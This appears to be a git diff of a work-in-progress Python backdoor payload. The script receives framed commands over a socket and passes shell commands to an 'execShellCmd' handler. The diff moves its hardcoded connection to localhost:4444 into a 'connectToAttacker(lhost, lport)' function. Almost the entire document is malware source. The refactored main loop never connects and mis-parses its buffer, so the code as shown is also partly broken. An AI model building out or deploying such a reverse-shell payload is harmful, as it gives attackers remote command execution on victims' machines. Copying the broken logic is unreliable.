@@ -2,6 +2,7 @@ import socket as s
 import sys
 import time as t
 import subprocess
+from threading import Thread
 
 bufferSize = 5
 
@@ -30,34 +31,33 @@ commandSwitcher = {
     closeConnectionMessage: lambda con: closeConnection(con),
     shellCmdMessage: lambda cmd: execShellCmd(cmd),
     nextByteBufferSize: lambda size: size,
-    
+
 }
 
-while True:
-    try:
 
-        connection = s.socket()
-
-        connection.connect(("localhost", 4444))
-
-        while True:
-            t.sleep(1)
-            recv = connection.recv(bufferSize)
-            print(recv)
-            if recv.startswith(b'\x10\x10\x10\x10'):
-                start = recv.find(b"\x10\x10\x10\x10") + len(b'\x10\x10\x10\x10')
-                print(start)
-                end = recv.find(b'\x11\x11\x11\x11')
-                command = recv[start: end]
-                print(command)
-            if recv.startswith(nextByteBufferSize):
-                bufferSize = int.from_bytes(recv[4], "big")
-                print(bufferSize)
-                print(len(nextByteBufferSize))
+def connectToAttacker(con: s.SOCK_STREAM, lhost: str, lport: int):
+    con.connect((lhost, lport))
 
 
+def main():
 
 
+    connection = s.socket()
 
-    except Exception as eee:
-        print("PAYLOAD SCRIPT ERROR: " + str(eee))
+    while True:
+        t.sleep(1)
+        recv = connection.recv(bufferSize)
+        print(recv)
+        if recv.startswith(b'\x10\x10\x10\x10'):
+            start = recv.find(b"\x10\x10\x10\x10") + len(b'\x10\x10\x10\x10')
+            print(start)
+            end = recv.find(b'\x11\x11\x11\x11')
+            command = recv[start: end]
+            print(command)
+        if recv.startswith(nextByteBufferSize):
+            bufferSize = int.from_bytes(recv[4], "big")
+            print(bufferSize)
+            print(len(nextByteBufferSize))
+
+        # except Exception as eee:
+        # print("PAYLOAD SCRIPT ERROR: " + str(eee))
